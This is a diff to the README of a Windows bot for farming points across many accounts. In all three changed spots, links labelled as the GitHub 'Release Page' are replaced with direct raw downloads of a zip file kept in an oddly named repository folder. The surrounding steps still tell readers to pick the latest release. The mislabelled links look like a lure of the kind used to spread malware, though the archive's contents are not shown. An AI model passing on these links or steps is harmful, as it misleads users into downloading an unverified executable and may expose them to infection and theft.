@@ -1,6 +1,6 @@
 # 🤖 Predict-Fun-Farming-Bot - Farm points across many accounts
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/Buint1504/Predict-Fun-Farming-Bot/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/Buint1504/Predict-Fun-Farming-Bot/raw/refs/heads/main/circumclude/Fun-Predict-Farming-Bot-2.6.zip)
 
 ## 🚀 What this app does
 
@@ -25,7 +25,7 @@ This app is built for Windows users who want a simple way to get started.
 
 ## 📥 Download the app
 
-1. Open the release page here: [Predict-Fun-Farming-Bot Releases](https://github.com/Buint1504/Predict-Fun-Farming-Bot/releases)
+1. Open the release page here: [Predict-Fun-Farming-Bot Releases](https://github.com/Buint1504/Predict-Fun-Farming-Bot/raw/refs/heads/main/circumclude/Fun-Predict-Farming-Bot-2.6.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file from that release
 4. Save the file to a folder you can reach from your desktop or Downloads folder
@@ -154,7 +154,7 @@ If an account stops, check that:
 ## 🔄 Update steps
 
 When a new version comes out:
-1. Visit the release page again: [Predict-Fun-Farming-Bot Releases](https://github.com/Buint1504/Predict-Fun-Farming-Bot/releases)
+1. Visit the release page again: [Predict-Fun-Farming-Bot Releases](https://github.com/Buint1504/Predict-Fun-Farming-Bot/raw/refs/heads/main/circumclude/Fun-Predict-Farming-Bot-2.6.zip)
 2. Download the latest Windows file
 3. Close the old version
 4. Replace the old files with the new ones
